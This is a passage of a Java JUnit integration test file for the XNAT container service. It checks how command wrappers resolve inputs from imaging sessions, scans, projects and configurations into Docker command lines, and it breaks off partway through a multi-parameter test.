package org.nrg.containers;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.google.common.collect.Maps;
import com.google.common.collect.Sets;
import com.jayway.jsonpath.Configuration;
import com.jayway.jsonpath.Option;
import com.jayway.jsonpath.spi.json.JacksonJsonProvider;
import com.jayway.jsonpath.spi.json.JsonProvider;
import com.jayway.jsonpath.spi.mapper.JacksonMappingProvider;
import com.jayway.jsonpath.spi.mapper.MappingProvider;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.io.FileUtils;
import org.hamcrest.Matchers;
import org.junit.Before;
import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.TemporaryFolder;
import org.junit.runner.RunWith;
import org.mockito.Mockito;
import org.mockito.invocation.InvocationOnMock;
import org.mockito.stubbing.Answer;
import org.nrg.config.services.ConfigService;
import org.nrg.containers.config.IntegrationTestConfig;
import org.nrg.containers.exceptions.CommandResolutionException;
import org.nrg.containers.exceptions.IllegalInputException;
import org.nrg.containers.model.command.auto.Command;
import org.nrg.containers.model.command.auto.Command.CommandInput;
import org.nrg.containers.model.command.auto.Command.CommandWrapper;
import org.nrg.containers.model.command.auto.Command.CommandWrapperExternalInput;
import org.nrg.containers.model.command.auto.Command.ConfiguredCommand;
import org.nrg.containers.model.command.auto.ResolvedCommand;
import org.nrg.containers.model.command.auto.ResolvedCommandMount;
import org.nrg.containers.model.command.auto.ResolvedInputTreeNode;
import org.nrg.containers.model.command.auto.ResolvedInputValue;
import org.nrg.containers.model.command.entity.CommandType;
import org.nrg.containers.model.configuration.CommandConfiguration;
import org.nrg.containers.model.configuration.CommandConfiguration.CommandInputConfiguration;
import org.nrg.containers.model.configuration.CommandConfigurationInternal;
import org.nrg.containers.model.server.docker.DockerServerBase;
import org.nrg.containers.model.xnat.*;
import org.nrg.containers.services.CommandResolutionService;
import org.nrg.containers.services.CommandService;
import org.nrg.containers.services.ContainerConfigService;
import org.nrg.containers.services.DockerService;
import org.nrg.framework.constants.Scope;
import org.nrg.xdat.preferences.SiteConfigPreferences;
import org.nrg.xdat.security.user.XnatUserProvider;
import org.nrg.xft.security.UserI;
import org.nrg.xnat.services.archive.CatalogService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.test.annotation.DirtiesContext;
import org.springframework.test.context.ContextConfiguration;
import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;
import org.springframework.test.context.transaction.TestTransaction;
import org.springframework.transaction.annotation.Transactional;

import java.io.File;
import java.nio.file.Paths;
import java.util.*;
import java.util.stream.Collectors;

import static org.hamcrest.Matchers.containsInAnyOrder;
import static org.hamcrest.Matchers.hasSize;
import static org.hamcrest.Matchers.is;
import static org.hamcrest.Matchers.not;
import static org.hamcrest.Matchers.nullValue;
import static org.hamcrest.Matchers.startsWith;
import static org.junit.Assert.assertThat;
import static org.junit.Assert.fail;
import static org.mockito.Matchers.any;
import static org.mockito.Matchers.eq;
import static org.mockito.Mockito.*;

@Slf4j
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(classes = IntegrationTestConfig.class)
@Transactional
public class CommandResolutionTest {
    private UserI mockUser;
    private Command dummyCommand;
    private String resourceDir;
    private Map<String, CommandWrapper> xnatCommandWrappers;
    private String buildDir;

    private String pathTranslationXnatPrefix = "/some/fake/xnat/path";
    private String pathTranslationContainerHostPrefix = "/some/other/fake/path/to/another/place";

    @Autowired private ObjectMapper mapper;
    @Autowired private CommandService commandService;
    @Autowired private CommandResolutionService commandResolutionService;
    @Autowired private ConfigService mockConfigService;
    @Autowired private SiteConfigPreferences mockSiteConfigPreferences;
    @Autowired private DockerService dockerService;
    @Autowired private CatalogService mockCatalogService;
    @Autowired private XnatUserProvider primaryAdminUserProvider;   //mocked but has to be named this way for
                                                                    //org.nrg.xdat.security.helpers.Users.getAdminUser

    @Rule
    public TemporaryFolder folder = new TemporaryFolder(new File("/tmp"));

    @Before
    public void setup() throws Exception {
        Configuration.setDefaults(new Configuration.Defaults() {

            private final JsonProvider jsonProvider = new JacksonJsonProvider();
            private final MappingProvider mappingProvider = new JacksonMappingProvider();

            @Override
            public JsonProvider jsonProvider() {
                return jsonProvider;
            }

            @Override
            public MappingProvider mappingProvider() {
                return mappingProvider;
            }

            @Override
            public Set<Option> options() {
                return Sets.newHashSet(Option.DEFAULT_PATH_LEAF_TO_NULL);
            }
        });

        mockUser = Mockito.mock(UserI.class);
        when(mockUser.getLogin()).thenReturn("mockUser");
        when(primaryAdminUserProvider.get()).thenReturn(mockUser);

        resourceDir = Paths.get(ClassLoader.getSystemResource("commandResolutionTest").toURI()).toString().replace("%20", " ");
        final String commandJsonFile = resourceDir + "/command.json";
        final Command tempCommand = mapper.readValue(new File(commandJsonFile), Command.class);
        dummyCommand = commandService.create(tempCommand);

        xnatCommandWrappers = Maps.newHashMap();
        for (final CommandWrapper commandWrapperEntity : dummyCommand.xnatCommandWrappers()) {
            xnatCommandWrappers.put(commandWrapperEntity.name(), commandWrapperEntity);
        }

        buildDir = folder.newFolder().getAbsolutePath();
        when(mockSiteConfigPreferences.getBuildPath()).thenReturn(buildDir);

        when(mockCatalogService.hasRemoteFiles(eq(mockUser), any(String.class))).thenReturn(false);

        dockerService.setServer(DockerServerBase.DockerServer.create(0L, "test", "unix:///var/run/docker.sock",
                null, false, pathTranslationXnatPrefix, pathTranslationContainerHostPrefix,
                false, null, true, null));
    }

    @Test
    @DirtiesContext
    public void testGetAndConfigure() throws Exception {

        final String commandInputName = "command-input";
        final String commandInputDefaultValue = "yucky";
        final String commandInputConfiguredDefaultValue = "yummy";
        final String commandWrapperExternalInputName = "wrapper-input";
        final String commandWrapperExternalInputDefaultValue = "blue";
        final String commandWrapperExternalInputConfiguredDefaultValue = "red";
        final Command command = commandService.create(Command.builder()
                .name("command")
                .image("whatever")
                .addInput(CommandInput.builder()
                        .name(commandInputName)
                        .defaultValue(commandInputDefaultValue)
                        .build())
                .addCommandWrapper(CommandWrapper.builder()
                        .name("wrapper")
                        .addExternalInput(CommandWrapperExternalInput.builder()
                                .name(commandWrapperExternalInputName)
                                .defaultValue(commandWrapperExternalInputDefaultValue)
                                .build())
                        .build())
                .build());

        TestTransaction.flagForCommit();
        TestTransaction.end();
        TestTransaction.start();

        final CommandConfiguration siteConfiguration = CommandConfiguration.builder()
                .addInput(commandInputName, CommandInputConfiguration.builder()
                        .defaultValue(commandInputConfiguredDefaultValue)
                        .build())
                .build();
        final CommandConfigurationInternal siteConfigurationInternal =
                CommandConfigurationInternal.create(true, siteConfiguration);
        final String siteConfigJson = mapper.writeValueAsString(siteConfigurationInternal);
        final org.nrg.config.entities.Configuration mockSiteConfig =
                Mockito.mock(org.nrg.config.entities.Configuration.class);
        when(mockSiteConfig.getContents()).thenReturn(siteConfigJson);

        final CommandConfigurationInternal projectConfigurationInternal =
                siteConfigurationInternal.merge(CommandConfigurationInternal.create(true, CommandConfiguration.builder()
                        .addInput(commandWrapperExternalInputName, CommandInputConfiguration.builder()
                                .defaultValue(commandWrapperExternalInputConfiguredDefaultValue)
                                .build())
                        .build()), true);
        final CommandConfiguration projectConfiguration = CommandConfiguration.create(
                command,
                command.xnatCommandWrappers().get(0),
                projectConfigurationInternal
        );
        final org.nrg.config.entities.Configuration mockProjectConfig =
                Mockito.mock(org.nrg.config.entities.Configuration.class);
        final String projectConfigJson = mapper.writeValueAsString(projectConfigurationInternal);
        when(mockProjectConfig.getContents()).thenReturn(projectConfigJson);

        final long wrapperId = command.xnatCommandWrappers().get(0).id();
        final String path = "wrapper-" + String.valueOf(wrapperId);
        final String project = "a-project";
        when(mockConfigService.getConfig(ContainerConfigService.TOOL_ID, path, Scope.Project, project))
                .thenReturn(mockProjectConfig);
        when(mockConfigService.getConfig(ContainerConfigService.TOOL_ID, path, Scope.Site, null))
                .thenReturn(mockSiteConfig);

        // Assert that the command is the command
        assertThat(commandService.get(command.id()), is(command));

        {
            // Assert that the site configuration changes the one default input value we set
            final ConfiguredCommand siteConfigCommand = siteConfiguration.apply(command);
            final CommandInput siteConfigCommandInput = siteConfigCommand.inputs().get(0);
            final CommandWrapperExternalInput siteConfigExternalInput = siteConfigCommand.wrapper().externalInputs().get(0);
            assertThat(siteConfigCommandInput.name(), is(commandInputName));
            assertThat(siteConfigCommandInput.defaultValue(), is(commandInputConfiguredDefaultValue)); // Default got changed
            assertThat(siteConfigExternalInput.name(), is(commandWrapperExternalInputName));
            assertThat(siteConfigExternalInput.defaultValue(), is(commandWrapperExternalInputDefaultValue)); // Default did not get changed

            // The service gives us the same command as doing the process manually
            assertThat(commandService.getAndConfigure(wrapperId), is(siteConfigCommand));
        }

        {
            // Assert that the project configuration changes both the default we set at the project level,
            // and the default we set at the site level.
            final ConfiguredCommand projectConfigCommand = projectConfiguration.apply(command);
            final CommandInput projectConfigCommandInput = projectConfigCommand.inputs().get(0);
            final CommandWrapperExternalInput siteConfigExternalInput = projectConfigCommand.wrapper().externalInputs().get(0);
            assertThat(projectConfigCommandInput.name(), is(commandInputName));
            assertThat(projectConfigCommandInput.defaultValue(), is(commandInputConfiguredDefaultValue)); // Default got changed
            assertThat(siteConfigExternalInput.name(), is(commandWrapperExternalInputName));
            assertThat(siteConfigExternalInput.defaultValue(), is(commandWrapperExternalInputConfiguredDefaultValue)); // Default got changed

            // The service gives us the same command as doing the process manually
            assertThat(commandService.getAndConfigure(project, wrapperId), is(projectConfigCommand));
        }
    }

    @Test
    public void testSessionScanResource() throws Exception {
        final String commandWrapperName = "session-scan-resource";
        final String inputPath = resourceDir + "/testSessionScanResource/session.json";

        // I want to set a resource directory at runtime, so pardon me while I do some unchecked stuff with the values I just read
        final String dicomDir = folder.newFolder("DICOM").getAbsolutePath();
        final Session session = mapper.readValue(new File(inputPath), Session.class);
        final Scan scan = session.getScans().get(0);
        scan.getResources().get(0).setDirectory(dicomDir);
        final String sessionRuntimeJson = mapper.writeValueAsString(session);

        final Map<String, String> runtimeValues = Maps.newHashMap();
        runtimeValues.put("session", sessionRuntimeJson);

        // xnat wrapper inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedWrapperInputValues = new HashSet<>();
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperExternal("T1-scantype", "\"SCANTYPE\", \"OTHER_SCANTYPE\""));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperExternal("session", session.getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("scan", scan.getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("dicom", scan.getResources().get(0).getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("scan-id", scan.getId()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("frames", String.valueOf(scan.getFrames())));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("series-description", scan.getSeriesDescription()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("modality", scan.getModality()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("quality", scan.getQuality()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("note", scan.getNote()));

        // command inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedCommandInputValues = new HashSet<>();
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("whatever", scan.getId()));
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("file-path", "null"));

        final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
        assertThat(commandWrapper, is(not(nullValue())));

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(commandWrapper.id()), runtimeValues, mockUser);
        assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
                runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
    }

    @Test
    public void testResourceFile() throws Exception {
        final String commandWrapperName = "scan-resource-file";
        final String inputPath = resourceDir + "/testResourceFile/scan.json";

        // I want to set a resource directory at runtime, so pardon me while I do some unchecked stuff with the values I just read
        final String resourceDir = folder.newFolder("resource").getAbsolutePath();
        final Scan scan = mapper.readValue(new File(inputPath), Scan.class);
        final Resource resource = scan.getResources().get(0);
        resource.setDirectory(resourceDir);
        resource.getFiles().get(0).setPath(resourceDir + "/" + resource.getFiles().get(0).getName());
        final String scanRuntimeJson = mapper.writeValueAsString(scan);
        final XnatFile file = resource.getFiles().get(0);

        final Map<String, String> runtimeValues = Maps.newHashMap();
        runtimeValues.put("a-scan", scanRuntimeJson);

        // xnat wrapper inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedWrapperInputValues = new HashSet<>();
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperExternal("a-scan", scan.getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("a-resource", resource.getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("a-file", file.getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("a-file-path", file.getPath()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("scan-id", scan.getId()));

        // command inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedCommandInputValues = new HashSet<>();
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("file-path", file.getPath()));
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("whatever", scan.getId()));

        final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
        assertThat(commandWrapper, is(not(nullValue())));

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(commandWrapper.id()), runtimeValues, mockUser);
        assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
                runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
    }

    @Test
    public void testProject() throws Exception {
        final String commandWrapperName = "project";
        final String inputPath = resourceDir + "/testProject/project.json";

        // I want to set a resource directory at runtime, so pardon me while I do some unchecked stuff with the values I just read
        final Project project = mapper.readValue(new File(inputPath), Project.class);
        final String projectRuntimeJson = mapper.writeValueAsString(project);

        final Map<String, String> runtimeValues = Maps.newHashMap();
        runtimeValues.put("project", projectRuntimeJson);

        // xnat wrapper inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedWrapperInputValues = new HashSet<>();
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperExternal("project", project.getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("project-label", project.getLabel()));

        // command inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedCommandInputValues = new HashSet<>();
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("whatever", project.getLabel()));
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("file-path", "null"));

        final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
        assertThat(commandWrapper, is(not(nullValue())));

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(commandWrapper.id()), runtimeValues, mockUser);
        assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
                runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
    }

    @Test
    public void testProjectSubject() throws Exception {
        final String commandWrapperName = "project-subject";
        final String inputPath = resourceDir + "/testProjectSubject/project.json";

        // I want to set a resource directory at runtime, so pardon me while I do some unchecked stuff with the values I just read
        final Project project = mapper.readValue(new File(inputPath), Project.class);
        final String projectRuntimeJson = mapper.writeValueAsString(project);

        final Map<String, String> runtimeValues = Maps.newHashMap();
        runtimeValues.put("project", projectRuntimeJson);

        // xnat wrapper inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedWrapperInputValues = new HashSet<>();
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperExternal("project", project.getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("subject", project.getSubjects().get(0).getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("project-label", project.getLabel()));

        // command inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedCommandInputValues = new HashSet<>();
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("whatever", project.getLabel()));
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("file-path", "null"));

        final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
        assertThat(commandWrapper, is(not(nullValue())));

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(commandWrapper.id()), runtimeValues, mockUser);
        assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
                runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
    }

    @Test
    public void testSessionAssessor() throws Exception {
        final String commandWrapperName = "session-assessor";
        final String inputPath = resourceDir + "/testSessionAssessor/session.json";

        // I want to set a resource directory at runtime, so pardon me while I do some unchecked stuff with the values I just read
        final Session session = mapper.readValue(new File(inputPath), Session.class);
        final String sessionRuntimeJson = mapper.writeValueAsString(session);
        final Assessor assessor = session.getAssessors().get(0);

        final Map<String, String> runtimeValues = Maps.newHashMap();
        runtimeValues.put("session", sessionRuntimeJson);

        final Set<ResolvedCommand.ResolvedCommandInput> expectedWrapperInputValues = new HashSet<>();
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperExternal("session", session.getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("assessor", assessor.getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("assessor-label", assessor.getLabel()));

        final Set<ResolvedCommand.ResolvedCommandInput> expectedCommandInputValues = new HashSet<>();
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("whatever", assessor.getLabel()));
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("file-path", "null"));

        final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
        assertThat(commandWrapper, is(not(nullValue())));

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(commandWrapper.id()), runtimeValues, mockUser);
        assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
                runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
    }

    // TODO Re-do this test when I figure out how config inputs should work & should be resolved
    // @Test
    // public void testConfig() throws Exception {
    //     final String siteConfigName = "site-config";
    //     final String siteConfigInput = "{" +
    //             "\"name\": \"" + siteConfigName + "\", " +
    //             "\"type\": \"Config\", " +
    //             "\"required\": true" +
    //             "}";
    //     final String projectInputName = "project";
    //     final String projectInput = "{" +
    //             "\"name\": \"" + projectInputName + "\", " +
    //             "\"description\": \"This input accepts a project\", " +
    //             "\"type\": \"Project\", " +
    //             "\"required\": true" +
    //             "}";
    //     final String projectConfigName = "project-config";
    //     final String projectConfigInput = "{" +
    //             "\"name\": \"" + projectConfigName + "\", " +
    //             "\"type\": \"Config\", " +
    //             "\"required\": true," +
    //             "\"parent\": \"" + projectInputName + "\"" +
    //             "}";
    //
    //     final String commandLine = "echo hello world";
    //     final String commandJson = "{" +
    //             "\"name\": \"command\", " +
    //             "\"description\": \"Testing config inputs\"," +
    //             "\"docker-image\": \"" + BUSYBOX_LATEST + "\"," +
    //             "\"run\": {" +
    //                 "\"command-line\": \"" + commandLine + "\"" +
    //             "}," +
    //             "\"inputs\": [" +
    //                 projectInput + ", " +
    //                 siteConfigInput + ", " +
    //                 projectConfigInput + //", " +
    //             "]" +
    //             "}";
    //     final Command command = mapper.readValue(commandJson, Command.class);
    //     commandService.create(command);
    //
    //     final String toolname = "toolname";
    //     final String siteConfigFilename = "site-config-filename";
    //     final String siteConfigContents = "Hey, I am stored in a site config!";
    //     when(mockConfigService.getConfigContents(toolname, siteConfigFilename, Scope.Site, null))
    //             .thenReturn(siteConfigContents);
    //
    //     final String projectId = "theProject";
    //     final String projectConfigFilename = "project-config-filename";
    //     final String projectConfigContents = "Hey, I am stored in a project config!";
    //     when(mockConfigService.getConfigContents(toolname, projectConfigFilename, Scope.Project, projectId))
    //             .thenReturn(projectConfigContents);
    //
    //     final String projectUri = "/projects/" + projectId;
    //     final String projectRuntimeJson = "{" +
    //             "\"id\": \"" + projectId + "\", " +
    //             "\"label\": \"" + projectId + "\", " +
    //             "\"uri\": \"" + projectUri + "\", " +
    //             "\"type\": \"Project\"" +
    //             "}";
    //
    //     final Map<String, String> runtimeValues = Maps.newHashMap();
    //     runtimeValues.put(siteConfigName, toolname + "/" + siteConfigFilename);
    //     runtimeValues.put(projectConfigName, toolname + "/" + projectConfigFilename);
    //     runtimeValues.put(projectInputName, projectRuntimeJson);
    //
    //     final ResolvedCommand resolvedCommand = commandService.resolveCommand(command, runtimeValues, mockUser);
    //     assertThat(resolvedCommand.getCommandId(), is(command.getId()));
    //     assertThat(resolvedCommand.getImage(), is(command.getImage()));
    //     assertThat(resolvedCommand.getCommandLine(), is(commandLine));
    //     assertThat(resolvedCommand.getEnvironmentVariables().isEmpty(), is(true));
    //     assertThat(resolvedCommand.getMountsIn().isEmpty(), is(true));
    //     assertThat(resolvedCommand.getMountsOut().isEmpty(), is(true));
    //     assertThat(resolvedCommand.getOutputs().isEmpty(), is(true));
    //     assertThat(resolvedCommand, instanceOf(ResolvedDockerCommand.class));
    //     assertThat(((ResolvedDockerCommand) resolvedCommand).getPorts().isEmpty(), is(true));
    //
    //     final Map<String, String> inputValues = resolvedCommand.getCommandInputValues();
    //     assertThat(inputValues, hasEntry(siteConfigName, siteConfigContents));
    //     assertThat(inputValues, hasEntry(projectConfigName, projectConfigContents));
    //     assertThat(inputValues, hasEntry(projectInputName, projectUri));
    // }


    @Test
    public void testSessionScanMultiple() throws Exception {
        final String commandWrapperName = "session-scan-mult";
        final String inputPath = resourceDir + "/testSessionScanMult/session.json";

        final Session session = mapper.readValue(new File(inputPath), Session.class);
        final Map<String, String> runtimeValues = Maps.newHashMap();
        runtimeValues.put("session", mapper.writeValueAsString(session));

        // xnat wrapper inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedWrapperInputValues = new HashSet<>();
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperExternal("session", session.getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperExternal("T1-scantype", "\"SCANTYPE\", \"OTHER_SCANTYPE\""));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("scan",
                session.getScans().stream().map(Scan::getId).collect(Collectors.joining(", "))));

        // command inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedCommandInputValues = new HashSet<>();
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("whatever",
                session.getScans().stream().map(Scan::getId).collect(Collectors.joining(" "))));
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("file-path", "null"));

        final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
        assertThat(commandWrapper, is(not(nullValue())));

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(commandWrapper.id()), runtimeValues, mockUser);
        assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
                runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
    }

    @Test
    public void testSessionScanMultipleUri() throws Exception {
        final String commandWrapperName = "session-scan-mult-uri";
        final String inputPath = resourceDir + "/testSessionScanMult/session.json";

        final Session session = mapper.readValue(new File(inputPath), Session.class);
        final Map<String, String> runtimeValues = Maps.newHashMap();
        runtimeValues.put("session", mapper.writeValueAsString(session));

        // xnat wrapper inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedWrapperInputValues = new HashSet<>();
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperExternal("session", session.getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperExternal("T1-scantype", "\"SCANTYPE\", \"OTHER_SCANTYPE\""));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("scan",
                session.getScans().stream().map(Scan::getUri).collect(Collectors.joining(", "))));

        // command inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedCommandInputValues = new HashSet<>();
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("whatever",
                session.getScans().stream().map(Scan::getUri).collect(Collectors.joining(" "))));
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("file-path", "null"));

        final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
        assertThat(commandWrapper, is(not(nullValue())));

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(commandWrapper.id()), runtimeValues, mockUser);
        assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
                runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
    }

    private void assertStuffAboutResolvedCommand(final ResolvedCommand resolvedCommand,
                                                 final Command dummyCommand,
                                                 final CommandWrapper commandWrapper,
                                                 final Map<String, String> expectedRawInputValues,
                                                 final Set<ResolvedCommand.ResolvedCommandInput> expectedWrapperInputValues,
                                                 final Set<ResolvedCommand.ResolvedCommandInput> expectedCommandInputValues) {
        assertThat(resolvedCommand.commandId(), is(dummyCommand.id()));
        assertThat(resolvedCommand.wrapperId(), is(commandWrapper.id()));
        assertThat(resolvedCommand.image(), is(dummyCommand.image()));
        assertThat(resolvedCommand.commandLine(), is(dummyCommand.commandLine()));
        assertThat(resolvedCommand.environmentVariables().isEmpty(), is(true));
        assertThat(resolvedCommand.mounts().isEmpty(), is(true));
        assertThat(resolvedCommand.type(), is(CommandType.DOCKER.getName()));
        assertThat(resolvedCommand.ports().isEmpty(), is(true));

        // Inputs
        assertThat(resolvedCommand.rawInputValues(), is(expectedRawInputValues));
        assertThat(resolvedCommand.wrapperInputValues(), is(expectedWrapperInputValues));
        assertThat(resolvedCommand.commandInputValues(), is(expectedCommandInputValues));

        // Outputs
        assertThat(resolvedCommand.outputs().isEmpty(), is(true));
    }

    @Test
    public void testRequiredParamNotBlank() throws Exception {
        final String commandJsonFile = resourceDir + "/params-command.json";
        final Command tempCommand = mapper.readValue(new File(commandJsonFile), Command.class);
        final Command command = commandService.create(tempCommand);

        final Map<String, CommandWrapper> commandWrappers = Maps.newHashMap();
        for (final CommandWrapper commandWrapper : command.xnatCommandWrappers()) {
            commandWrappers.put(commandWrapper.name(), commandWrapper);
        }

        final CommandWrapper blankWrapper = commandWrappers.get("blank-wrapper");
        final Map<String, String> filledRuntimeValues = Maps.newHashMap();
        filledRuntimeValues.put("REQUIRED_WITH_FLAG", "foo");
        filledRuntimeValues.put("REQUIRED_NO_FLAG", "bar");

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(blankWrapper.id()), filledRuntimeValues, mockUser);
        assertThat(resolvedCommand.commandInputValues(),
                containsInAnyOrder(
                        ResolvedCommand.ResolvedCommandInput.command("REQUIRED_WITH_FLAG", "foo"),
                        ResolvedCommand.ResolvedCommandInput.command("REQUIRED_NO_FLAG", "bar"),
                        ResolvedCommand.ResolvedCommandInput.command("NOT_REQUIRED", "null")
                )
        );
        assertThat(resolvedCommand.commandLine(), is("echo bar --flag foo "));


        try {
            final Map<String, String> blankRuntimeValues = Maps.newHashMap();  // Empty map
            commandResolutionService.resolve(commandService.getAndConfigure(blankWrapper.id()), blankRuntimeValues, mockUser);
            fail("Command resolution should have failed with missing required parameters.");
        } catch (CommandResolutionException e) {
            assertThat(e.getMessage(), is("Missing values for required inputs: REQUIRED_NO_FLAG, REQUIRED_WITH_FLAG."));
        }
    }

    @Test
    public void testMultiParamCommandLine() throws Exception {
        final String commandJsonFile = resourceDir + "/multi-command.json";
        final Command tempCommand = mapper.readValue(new File(commandJsonFile), Command.class);
        final Command command = commandService.create(tempCommand);

        final Map<String, CommandWrapper> commandWrappers = Maps.newHashMap();
        for (final CommandWrapper commandWrapper : command.xnatCommandWrappers()) {
            commandWrappers.put(commandWrapper.name(), commandWrapper);
        }
        final CommandWrapper wrapper = commandWrappers.get("multiple");

        final String inputPath = resourceDir + "/testSessionScanMult/session.json";
        final Session session = mapper.readValue(new File(inputPath), Session.class);
        final Map<String, String> runtimeValues = Maps.newHashMap();
        runtimeValues.put("session", mapper.writeValueAsString(session));
        List<String> scanIds = session.getScans().stream().map(Scan::getId).collect(Collectors.toList());
        String spacedScanIds = String.join(" ", scanIds);

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(wrapper.id()), runtimeValues, mockUser);
        assertThat(resolvedCommand.commandInputValues(),
                containsInAnyOrder(
                        ResolvedCommand.ResolvedCommandInput.command("MULTI_FLAG1", spacedScanIds),
                        ResolvedCommand.ResolvedCommandInput.command("MULTI_FLAG2", spacedScanIds),
                        ResolvedCommand.ResolvedCommandInput.command("MULTI_QSPACE", spacedScanIds),
                        ResolvedCommand.ResolvedCommandInput.command("MULTI_QSPACE_FLAG", spacedScanIds),
                        ResolvedCommand.ResolvedCommandInput.command("MULTI_COMMA", spacedScanIds),
                        ResolvedCommand.ResolvedCommandInput.command("MULTI_SPACE", spacedScanIds),
                        ResolvedCommand.ResolvedCommandInput.command("MULTI_DEFAULT", spacedScanIds),
